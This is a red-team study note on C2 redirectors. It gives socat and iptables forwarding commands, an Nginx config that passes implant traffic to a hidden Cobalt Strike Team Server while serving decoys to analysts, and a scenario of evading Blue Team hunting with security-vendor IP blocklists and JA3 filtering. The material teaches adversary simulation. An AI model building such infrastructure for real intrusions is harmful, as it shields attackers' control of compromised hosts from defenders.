---
tags: [c2, red-team, infrastructure, vapt]
difficulty: intermediate
module: "94 - Command and Control Foundations and Architectures"
topic: "94.07 Redirectors Socat Iptables Nginx"
---

# Redirectors: Socat, Iptables, and Nginx

## Introduction to C2 Redirectors

In any professional Red Team engagement or advanced adversary simulation, exposing the actual Command and Control (C2) Team Server directly to the target network is a critical operational security (OpSec) failure. If the target's Blue Team discovers the IP address of the C2 server, they can block it, scan it, attribute it, and potentially attack it. 

To solve this, Red Teams employ **Redirectors**—intermediary servers that sit between the compromised target (the implant/beacon) and the backend Team Server. Redirectors act as proxies, masking the true location of the C2 infrastructure. If a redirector is burned (detected and blocked), the Red Team can simply spin down the burned instance and deploy a new one without losing their shells, as the Team Server remains safely hidden.

Redirectors are broadly categorized into two types:
1. **Dumb Redirectors**: Blindly forward traffic at the TCP/UDP layer without inspecting the payload (e.g., `socat`, `iptables`).
2. **Smart Redirectors**: Inspect application-layer data (HTTP/S) and make conditional routing decisions based on headers, URIs, User-Agents, or TLS fingerprints (e.g., `Nginx`, `HAProxy`, `Apache`).

## The Tiered C2 Architecture

A resilient infrastructure utilizes a tiered model:

```text
                               +-------------------+
                               |                   |
                               | Target Enterprise |
                               |    (Implants)     |
                               |                   |
                               +---------+---------+
                                         |
                                         | HTTP/HTTPS
                                         v
+------------------+    +---------------------------------+    +------------------+
|                  |    |                                 |    |                  |
| Tier 1 Redirector|    |      Tier 1 Redirector          |    | Tier 1 Redirector|
|    (Dumb)        |    |          (Smart)                |    |     (Smart)      |
|  [ socat/iptables]    | [ Nginx / Apache / HAProxy ]    |    |  [ Cloud CDN ]   |
|                  |    |                                 |    |                  |
+---------+--------+    +----------------+----------------+    +--------+---------+
          |                              |                              |
          |                              |                              |
          |                              v                              |
          |             +---------------------------------+             |
          |             |                                 |             |
          +------------>|      Tier 2 Redirector          |<------------+
                        |   (Internal Routing/Auth)       |
                        |                                 |
                        +----------------+----------------+
                                         |
                                         v
                        +---------------------------------+
                        |                                 |
                        |      C2 Team Server             |
                        |  (Cobalt Strike / Mythic)       |
                        |                                 |
                        +---------------------------------+
```

## Dumb Redirectors: Socat and Iptables

Dumb redirectors operate at Layer 4 (Transport Layer). They do not decrypt HTTPS traffic; they merely take incoming packets on a specific port and forward them to another IP and port. 

### Socat
`socat` is a versatile networking tool that establishes two bidirectional byte streams and transfers data between them. It is excellent for rapid, temporary redirection.

**Forwarding TCP Port 443 to the Team Server:**
```bash
# Listen on local port 443, forward to TeamServer_IP on port 443
# Fork allows multiple connections.
socat TCP4-LISTEN:443,fork TCP4:TeamServer_IP:443
```
*Pros*: Extremely simple to set up, highly portable.
*Cons*: Cannot filter bad traffic. Scanners like Shodan will reach your Team Server directly.

### Iptables
For a more robust, kernel-level dumb redirector, `iptables` Network Address Translation (NAT) rules are preferred. This processes traffic at the network stack level, resulting in lower latency and higher reliability than user-space tools like `socat`.

**Configuring IP Forwarding and NAT:**
```bash
# Enable IP forwarding in the kernel
sysctl -w net.ipv4.ip_forward=1
echo 1 > /proc/sys/net/ipv4/ip_forward

# Prerouting: Change the destination IP of incoming packets on port 443
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination TeamServer_IP:443

# Postrouting: Change the source IP so the Team Server routes replies back through the redirector
iptables -t nat -A POSTROUTING -p tcp -d TeamServer_IP --dport 443 -j MASQUERADE
```
*Pros*: Kernel-level performance, very stable.
*Cons*: Still a dumb redirector; cannot inspect or block application-layer scanning.

## Smart Redirectors: Nginx

Smart redirectors operate at Layer 7 (Application Layer). They terminate the inbound connection, inspect the HTTP headers, URIs, and User-Agents, and then decide whether to route the traffic to the Team Server or serve a benign "decoy" page. This is critical for evading Blue Team active hunting and internet scanners.

### Nginx Conditional Routing

Using Nginx as a reverse proxy, we can create rules that only forward traffic matching the exact signature of our C2 implant. All other traffic (scanners, analysts investigating the IP) is served a decoy page or redirected to a legitimate site.

**Example Nginx Configuration for C2 Filtering:**

```nginx
server {
    listen 443 ssl;
    server_name proxy.malicious-domain.com;

    # SSL Configuration (Let's Encrypt certificates)
    ssl_certificate /etc/letsencrypt/live/proxy.malicious-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/proxy.malicious-domain.com/privkey.pem;

    # Default action: route to decoy site
    location / {
        proxy_pass https://legitimate-site.com;
        proxy_set_header Host legitimate-site.com;
    }

    # Conditional routing based on specific C2 URIs and User-Agents
    location ~ ^/(api/v1/update|submit/telemetry) {
        
        # Check User-Agent (Must match the implant's Malleable profile exactly)
        if ($http_user_agent != "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36") {
            return 302 https://legitimate-site.com;
        }

        # If conditions are met, proxy to the hidden Team Server
        proxy_pass https://TeamServer_IP:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_addrs;
        
        # Prevent Nginx from modifying the C2 headers/responses
        proxy_buffering off;
        proxy_ssl_verify off;
    }
}
```

### Advanced Filtering: JA3 and IP Blocklists
To further harden the redirector, Red Teams integrate tools like `nginx_mod_stream` or external WAFs to drop connections based on JA3 TLS fingerprints associated with known scanners (Censys, Shodan, Palo Alto Cortex). Additionally, extensive IP blocklists mapping security vendor CIDR blocks are loaded into Nginx's `deny` directives.

## Real-World Attack Scenario

### Evading Active Infrastructure Hunting
During a long-term engagement, the Red Team deployed a Cobalt Strike Team Server. Instead of exposing it, they deployed an Nginx smart redirector on a cheap DigitalOcean droplet with a newly categorized domain (`finance-portal-update.com`).

**The Attack Flow:**
1. A Blue Team analyst notices periodic outbound HTTPS connections to `finance-portal-update.com` from a workstation.
2. The analyst navigates to `https://finance-portal-update.com` in their browser to investigate.
3. Because the analyst's browser is requesting `/` and does not have the exact User-Agent defined in the Cobalt Strike Malleable C2 profile, the Nginx redirector transparently proxies the request to a legitimate financial news site. The analyst sees normal web content.
4. Meanwhile, internet-wide scanners like Shodan attempt to probe the IP. The Nginx server drops the connections based on known Shodan IP ranges and mismatched JA3 hashes.
5. The actual C2 beacon, using the correct URI (`/api/v1/update`) and the exact matched User-Agent, successfully communicates through Nginx to the hidden Team Server. The infrastructure remains safe and unburned.

## Chaining Opportunities

Redirectors form the backbone of Red Team infrastructure. They are effectively combined with:
- **Cloud Deployments**: Deploying redirectors across various cloud providers via Terraform to quickly rotate IPs. (See [[08 - Cloud Infrastructure for C2 AWS Azure DigitalOcean]])
- **CDN Fronting**: Placing a CDN in front of an Nginx redirector. The CDN handles reputation, while Nginx handles the smart filtering. (See [[06 - Domain Fronting and CDN Abuse]])

## Related Notes
- [[06 - Domain Fronting and CDN Abuse]]
- [[08 - Cloud Infrastructure for C2 AWS Azure DigitalOcean]]
- [[09 - C2 Obfuscation and Jitter]]
- [[10 - C2 Network Signatures and TLS Fingerprinting]]
